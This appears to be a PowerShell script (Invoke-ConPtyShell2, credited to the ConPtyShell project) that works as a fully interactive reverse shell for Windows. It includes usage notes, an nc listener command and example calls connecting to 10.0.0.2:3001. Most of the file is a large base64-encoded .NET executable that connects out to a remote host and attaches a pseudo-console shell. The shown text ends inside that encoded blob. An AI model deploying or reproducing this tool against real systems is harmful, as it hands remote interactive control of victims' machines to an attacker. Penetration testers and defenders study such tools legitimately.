#Requires -Version 2

function Invoke-ConPtyShell2
{   
    <#
        .SYNOPSIS
            ConPtyShell - Fully Interactive Reverse Shell for Windows 
            Author: splinter_code
            License: MIT
            Source: https://github.com/antonioCoco/ConPtyShell
        
        .DESCRIPTION
            ConPtyShell - Fully interactive reverse shell for Windows
            
            Properly set the rows and cols values. You can retrieve it from
            your terminal with the command "stty size".
            
            You can avoid to set rows and cols values if you run your listener
            with the following command:
                stty raw -echo; (stty size; cat) | nc -lvnp 3001
           
            If you want to change the console size directly from powershell
            you can paste the following commands:
                $width=80
                $height=24
                $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height)
                $Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($width, $height)
            
            
        .PARAMETER RemoteIp
            The remote ip to connect
        .PARAMETER RemotePort
            The remote port to connect
        .PARAMETER Rows
            Rows size for the console
            Default: "24"
        .PARAMETER Cols
            Cols size for the console
            Default: "80"
        .PARAMETER CommandLine
            The commandline of the process that you are going to interact
            Default: "powershell.exe"
            
        .EXAMPLE  
            PS>Invoke-ConPtyShell2 10.0.0.2 3001
            
            Description
            -----------
            Spawn a reverse shell

        .EXAMPLE
            PS>Invoke-ConPtyShell2 -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90
            
            Description
            -----------
            Spawn a reverse shell with specific rows and cols size
            
         .EXAMPLE
            PS>Invoke-ConPtyShell2 -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe
            
            Description
            -----------
            Spawn a reverse shell (cmd.exe) with specific rows and cols size
            
    #>
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $RemoteIp,
        
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $RemotePort,

        [Parameter()]
        [String]
        $Rows = "24",

        [Parameter()]
        [String]
        $Cols = "80",

        [Parameter()]
        [String]
        $CommandLine = "powershell.exe"
    )
    $parametersConPtyShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
    $ConPtyShellBase64 = "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4gIBAAABJQDuAgEAAAEnAPsCAgAAASkABgMBAASAAAAAAAAAAAAAAAAAAAAAABoAAAAEAAAAAAAAAAAAAAABAI0AAAAAAAQAAAAAAAAAAAAAAAEAlgAAAAAAAwACAAQAAgAFAAIABgACAAcAAgA7AFcCOwBoAgAAADxNb2R1bGU+AENvblB0eVNoZWxsLmV4ZQBDb25QdHlTaGVsbABTVEFSVFVQSU5GT0VYAFNUQVJUVVBJTkZPAFBST0NFU1NfSU5GT1JNQVRJT04AU0VDVVJJVFlfQVRUUklCVVRFUwBDT09SRABDb25QdHlTaGVsbE1haW5DbGFzcwBNYWluQ2xhc3MAbXNjb3JsaWIAU3lzdGVtAE9iamVjdABWYWx1ZVR5cGUAZXJyb3JTdHJpbmcARU5BQkxFX1ZJUlRVQUxfVEVSTUlOQUxfUFJPQ0VTU0lORwBESVNBQkxFX05FV0xJTkVfQVVUT19SRVRVUk4AUFJPQ19USFJFQURfQVRUUklCVVRFX1BTRVVET0NPTlNPTEUARVhURU5ERURfU1RBUlRVUElORk9fUFJFU0VOVABJTkZJTklURQBTV19ISURFAEdFTkVSSUNfUkVBRABHRU5FUklDX1dSSVRFAEZJTEVfU0hBUkVfUkVBRABGSUxFX1NIQVJFX1dSSVRFAEZJTEVfQVRUUklCVVRFX05PUk1BTABPUEVOX0VYSVNUSU5HAFNURF9JTlBVVF9IQU5ETEUAU1REX09VVFBVVF9IQU5ETEUAU1REX0VSUk9SX0hBTkRMRQBJbml0aWFsaXplUHJvY1RocmVhZEF0dHJpYnV0ZUxpc3QAVXBkYXRlUHJvY1RocmVhZEF0dHJpYnV0ZQBDcmVhdGVQcm9jZXNzAFRlcm1pbmF0ZVByb2Nlc3MAV2FpdEZvclNpbmdsZU9iamVjdABTZXRTdGRIYW5kbGUAR2V0U3RkSGFuZGxlAENsb3NlSGFuZGxlAENyZWF0ZVBpcGUAQ3JlYXRlRmlsZQBSZWFkRmlsZQBXcml0ZUZpbGUAQ3JlYXRlUHNldWRvQ29uc29sZQBDbG9zZVBzZXVkb0NvbnNvbGUAU2V0Q29uc29sZU1vZGUAR2V0Q29uc29sZU1vZGUARnJlZUNvbnNvbGUAQWxsb2NDb25zb2xlAFNob3dXaW5kb3cAR2V0Q29uc29sZVdpbmRvdwBTeXN0ZW0uTmV0LlNvY2tldHMAU29ja2V0AENvbm5lY3RTb2NrZXQAVHJ5UGFyc2VSb3dzQ29sc0Zyb21Tb2NrZXQASW5pdENvbnNvbGUARW5hYmxlVmlydHVhbFRlcm1pbmFsU2VxdWVuY2VQcm9jZXNzaW5nAENyZWF0ZVBpcGVzQW5kUHNldWRvQ29uc29sZQBDb25maWd1cmVQcm9jZXNzVGhyZWFkAFJ1blByb2Nlc3MAQ3JlYXRlQ2hpbGRQcm9jZXNzV2l0aFBzZXVkb0NvbnNvbGUAVGhyZWFkUmVhZFBpcGVXcml0ZVNvY2tldABTeXN0ZW0uVGhyZWFkaW5nAFRocmVhZABTdGFydFRocmVhZFJlYWRQaXBlV3JpdGVTb2NrZXQAVGhyZWFkUmVhZFNvY2tldFdyaXRlUGlwZQBTdGFydFRocmVhZFJlYWRTb2NrZXRXcml0ZVBpcGUAU3Bhd25Db25QdHlTaGVsbABTdGFydHVwSW5mbwBscEF0dHJpYnV0ZUxpc3QAY2IAbHBSZXNlcnZlZABscERlc2t0b3AAbHBUaXRsZQBkd1gAZHdZAGR3WFNpemUAZHdZU2l6ZQBkd1hDb3VudENoYXJzAGR3WUNvdW50Q2hhcnMAZHdGaWxsQXR0cmlidXRlAGR3RmxhZ3MAd1Nob3dXaW5kb3cAY2JSZXNlcnZlZDIAbHBSZXNlcnZlZDIAaFN0ZElucHV0AGhTdGRPdXRwdXQAaFN0ZEVycm9yAGhQcm9jZXNzAGhUaHJlYWQAZHdQcm9jZXNzSWQAZHdUaHJlYWRJZABuTGVuZ3RoAGxwU2VjdXJpdHlEZXNjcmlwdG9yAGJJbmhlcml0SGFuZGxlAFgAWQBoZWxwAEhlbHBSZXF1aXJlZABDaGVja0FyZ3MARGlzcGxheUhlbHAAQ2hlY2tSZW1vdGVJcEFyZwBDaGVja0ludABQYXJzZVJvd3MAUGFyc2VDb2xzAFBhcnNlQ29tbWFuZExpbmUAQ29uUHR5U2hlbGxNYWluAE1haW4ALmN0b3IAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAE1hcnNoYWxBc0F0dHJpYnV0ZQBVbm1hbmFnZWRUeXBlAGR3QXR0cmlidXRlQ291bnQAbHBTaXplAGF0dHJpYnV0ZQBscFZhbHVlAGNiU2l6ZQBscFByZXZpb3VzVmFsdWUAbHBSZXR1cm5TaXplAGxwQXBwbGljYXRpb25OYW1lAGxwQ29tbWFuZExpbmUAbHBQcm9jZXNzQXR0cmlidXRlcwBscFRocmVhZEF0dHJpYnV0ZXMAYkluaGVyaXRIYW5kbGVzAGR3Q3JlYXRpb25GbGFncwBscEVudmlyb25tZW50AGxwQ3VycmVudERpcmVjdG9yeQBscFN0YXJ0dXBJbmZvAEluQXR0cmlidXRlAGxwUHJvY2Vzc0luZm9ybWF0aW9uAE91dEF0dHJpYnV0ZQB1RXhpdENvZGUAaEhhbmRsZQBkd01pbGxpc2Vjb25kcwBuU3RkSGFuZGxlAGhPYmplY3QAaFJlYWRQaXBlAGhXcml0ZVBpcGUAbHBQaXBlQXR0cmlidXRlcwBuU2l6ZQBscEZpbGVOYW1lAGR3RGVzaXJlZEFjY2VzcwBkd1NoYXJlTW9kZQBTZWN1cml0eUF0dHJpYnV0ZXMAZHdDcmVhdGlvbkRpc3Bvc2l0aW9uAGR3RmxhZ3NBbmRBdHRyaWJ1dGVzAGhUZW1wbGF0ZUZpbGUAaEZpbGUAbHBCdWZmZXIAbk51bWJlck9mQnl0ZXNUb1JlYWQAbHBOdW1iZXJPZkJ5dGVzUmVhZABscE92ZXJsYXBwZWQAbk51bWJlck9mQnl0ZXNUb1dyaXRlAGxwTnVtYmVyT2ZCeXRlc1dyaXR0ZW4Ac2l6ZQBoSW5wdXQAaE91dHB1dABwaFBDAGhQQwBoQ29uc29sZUhhbmRsZQBtb2RlAGhhbmRsZQBoV25kAG5DbWRTaG93AHJlbW90ZUlwAHJlbW90ZVBvcnQAc2hlbGxTb2NrZXQAcm93cwBjb2xzAGhhbmRsZVBzZXVkb0NvbnNvbGUAQ29uUHR5SW5wdXRQaXBlV3JpdGUAQ29uUHR5T3V0cHV0UGlwZVJlYWQAYXR0cmlidXRlcwBzSW5mb0V4AGNvbW1hbmRMaW5lAHRocmVhZFBhcmFtcwBoQ2hpbGRQcm9jZXNzAHBhcmFtAGFyZ3VtZW50cwBpcFN0cmluZwBhcmcAYXJncwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUARGxsSW1wb3J0QXR0cmlidXRlAGtlcm5lbDMyLmRsbAB1c2VyMzIuZGxsAFN5c3RlbS5OZXQASVBBZGRyZXNzAFBhcnNlAElQRW5kUG9pbnQARW5kUG9pbnQAQWRkcmVzc0ZhbWlseQBnZXRfQWRkcmVzc0ZhbWlseQBTb2NrZXRUeXBlAFByb3RvY29sVHlwZQBDb25uZWN0AGdldF9Db25uZWN0ZWQAU3lzdGVtLlRleHQARW5jb2RpbmcAZ2V0X0FTQ0lJAEdldEJ5dGVzAFNlbmQAU2xlZXAAZ2V0X0F2YWlsYWJsZQBCeXRlAFJlY2VpdmUAR2V0U3RyaW5nAENoYXIAU3RyaW5nAFNwbGl0AFRyaW0ASW50MzIAVHJ5UGFyc2UASW50UHRyAFplcm8ASW52YWxpZE9wZXJhdGlvbkV4Y2VwdGlvbgBvcF9FcXVhbGl0eQBNYXJzaGFsAEdldExhc3RXaW4zMkVycm9yAENvbmNhdABTaXplT2YAQWxsb2NIR2xvYmFsAGdldF9TaXplAG9wX0V4cGxpY2l0AFNvY2tldEZsYWdzAFBhcmFtZXRlcml6ZWRUaHJlYWRTdGFydABTdGFydABUb1N0cmluZwBGb3JtYXQAQWJvcnQAU29ja2V0U2h1dGRvd24AU2h1dGRvd24AQ2xvc2UAb3BfSW5lcXVhbGl0eQBTdHJ1Y3RMYXlvdXRBdHRyaWJ1dGUATGF5b3V0S2luZABDb25zb2xlAFN5c3RlbS5JTwBUZXh0V3JpdGVyAGdldF9PdXQAV3JpdGUARW52aXJvbm1lbnQARXhpdAAuY2N0b3IAAAAAQQ0ACgBDAG8AbgBQAHQAeQBTAGgAZQBsAGwAIAAtACAAQABzAHAAbABpAG4AdABlAHIAXwBjAG8AZABlAA0ACgABD0MATwBOAE8AVQBUACQAAA1DAE8ATgBJAE4AJAAANUMAbwB1AGwAZAAgAG4AbwB0ACAAZwBlAHQAIABjAG8AbgBzAG8AbABlACAAbQBvAGQAZQAAWUMAbwB1AGwAZAAgAG4AbwB0ACAAZQBuAGEAYgBsAGUAIAB2AGkAcgB0AHUAYQBsACAAdABlAHIAbQBpAG4AYQBsACAAcAByAG8AYwBlAHMAcwBpAG4AZwAASUMAbwB1AGwAZAAgAG4AbwB0ACAAYwByAGUAYQB0AGUAIAB0AGgAZQAgAEMAbwBuAFAAdAB5AEkAbgBwAHUAdABQAGkAcABlAABLQwBvAHUAbABkACAAbgBvAHQAIABjAHIAZQBhAHQAZQAgAHQAaABlACAAQwBvAG4AUAB0AHkATwB1AHQAcAB1AHQAUABpAHAAZQAAgIFDAG8AdQBsAGQAIABuAG8AdAAgAGMAYQBsAGMAdQBsAGEAdABlACAAdABoAGUAIABuAHUAbQBiAGUAcgAgAG8AZgAgAGIAeQB0AGUAcwAgAGYAbwByACAAdABoAGUAIABhAHQAdAByAGkAYgB1AHQAZQAgAGwAaQBzAHQALgAgAABDQwBvAHUAbABkACAAbgBvAHQAIABzAGUAdAAgAHUAcAAgAGEAdAB0AHIAaQBiAHUAdABlACAAbABpAHMAdAAuACAAAF1DAG8AdQBsAGQAIABuAG8AdAAgAHMAZQB0ACAAcABzAGUAdQBkAG8AYwBvAG4AcwBvAGwAZQAgAHQAaAByAGUAYQBkACAAYQB0AHQAcgBpAGIAdQB0AGUALgAgAAA1QwBvAHUAbABkACAAbgBvAHQAIABjAHIAZQBhAHQAZQAgAHAAcgBvAGMAZQBzAHMALgAgAAABAFV7ADAAfQBDAG8AdQBsAGQAIABuAG8AdAAgAGMAbwBuAG4AZQBjAHQAIAB0AG8AIABpAHAAIAB7ADEAfQAgAG8AbgAgAHAAbwByAHQAIAB7ADIAfQAAOXsAewB7AEMAbwBuAFAAdAB5AFMAaABlAGwAbABFAHgAYwBlAHAAdABpAG8AbgB9AH0AfQANAAoAAGV7ADAAfQBDAG8AdQBsAGQAIABuAG8AdAAgAGMAcgBlAGEAdABlACAAcABzAHUAZQBkAG8AIABjAG8AbgBzAG8AbABlAC4AIABFAHIAcgBvAHIAIABDAG8AZABlACAAewAxAH0AAD0NAAoAQwBvAG4AUAB0AHkAUwBoAGUAbABsACAAawBpAG4AZABsAHkAIABlAHgAaQB0AGUAZAAuAA0ACgAABS0AaAABDS0ALQBoAGUAbABwAAEFLwA/AACAuQ0ACgBDAG8AbgBQAHQAeQBTAGgAZQBsAGwAOgAgAE4AbwB0ACAAZQBuAG8AdQBnAGgAIABhAHIAZwB1AG0AZQBuAHQAcwAuACAAMgAgAEEAcgBnAHUAbQBlAG4AdABzACAAcgBlAHEAdQBpAHIAZQBkAC4AIABVAHMAZQAgAC0ALQBoAGUAbABwACAAZgBvAHIAIABhAGQAZABpAHQAaQBvAG4AYQBsACAAaABlAGwAcAAuAA0ACgABVw0ACgBDAG8AbgBQAHQAeQBTAGgAZQBsAGwAOgAgAEkAbgB2AGEAbABpAGQAIAByAGUAbQBvAHQAZQBJAHAAIAB2AGEAbAB1AGUAIAB7ADAAfQANAAoAAFUNAAoAQwBvAG4AUAB0AHkAUwBoAGUAbABsADoAIABJAG4AdgBhAGwAaQBkACAAaQBuAHQAZQBnAGUAcgAgAHYAYQBsAHUAZQAgAHsAMAB9AA0ACgAAHXAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAAjaUNAAoADQAKAEMAbwBuAFAAdAB5AFMAaABlAGwAbAAgAC0AIABGAHUAbABsAHkAIABJAG4AdABlAHIAYQBjAHQAaQB2AGUAIABSAGUAdgBlAHIAcwBlACAAUwBoAGUAbABsACAAZgBvAHIAIABXAGkAbgBkAG8AdwBzACAADQAKAEEAdQB0AGgAbwByADoAIABzAHAAbABpAG4AdABlAHIAXwBjAG8AZABlAA0ACgBMAGkAYwBlAG4AcwBlADoAIABNAEkAVAANAAoAUwBvAHUAcgBjAGUAOgAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AYQBuAHQAbwBuAGkAbwBDAG8AYwBvAC8AQwBvAG4AUAB0AHkAUwBoAGUAbABsAA0ACgAgACAAIAAgAA0ACgBDAG8AbgBQAHQAeQBTAGgAZQBsAGwAIAAtACAARgB1AGwAbAB5ACAAaQBuAHQAZQByAGEAYwB0AGkAdgBlACAAcgBlAHYAZQByAHMAZQAgAHMAaABlAGwAbAAgAGYAbwByACAAVwBpAG4AZABvAHcAcwANAAoADQAKAFAAcgBvAHAAZQByAGwAeQAgAHMAZQB0ACAAdABoAGUAIAByAG8AdwBzACAAYQBuAGQAIABjAG8AbABzACAAdgBhAGwAdQBlAHMALgAgAFkAbwB1ACAAYwBhAG4AIAByAGUAdAByAGkAZQB2AGUAIABpAHQAIABmAHIAbwBtAA0ACgB5AG8AdQByACAAdABlAHIAbQBpAG4AYQBsACAAdwBpAHQAaAAgAHQAaABlACAAYwBvAG0AbQBhAG4AZAAgACIAcwB0AHQAeQAgAHMAaQB6AGUAIgAuAA0ACgANAAoAWQBvAHUAIABjAGEAbgAgAGEAdgBvAGkAZAAgAHQAbwAgAHMAZQB0ACAAcgBvAHcAcwAgAGEAbgBkACAAYwBvAGwAcwAgAHYAYQBsAHUAZQBzACAAaQBmACAAeQBvAHUAIAByAHUAbgAgAHkAbwB1AHIAIABsAGkAcwB0AGUAbgBlAHIADQAKAHcAaQB0AGgAIAB0AGgAZQAgAGYAbwBsAGwAbwB3AGkAbgBnACAAYwBvAG0AbQBh